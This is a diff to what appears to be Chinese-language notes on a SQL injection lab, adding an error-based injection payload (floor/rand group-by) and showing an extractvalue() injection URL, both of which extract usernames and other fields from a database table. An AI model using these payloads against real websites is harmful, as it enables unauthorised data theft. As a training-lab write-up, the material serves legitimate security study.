@@ -212,6 +212,24 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename
 
 怎么会没有返回结果！无语了！
 
+可通过以下方式获得:
+
+```
+and(select 1 
+	from    (select count(*),concat(
+									(select 
+										(select 
+											(SELECT DISTINCT 
+												CONCAT(0x7e,username,0x7e,id,0x7e,motto,0x7e) FROM motto limit 3,1
+											)
+										) 
+									from information_schema.tables limit 0,1
+									),floor(rand(0)*2)
+									)x 
+			from information_schema.tables group by x)a
+	)%23 
+```
+
 换一个，接着研究。
 ```
 http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23
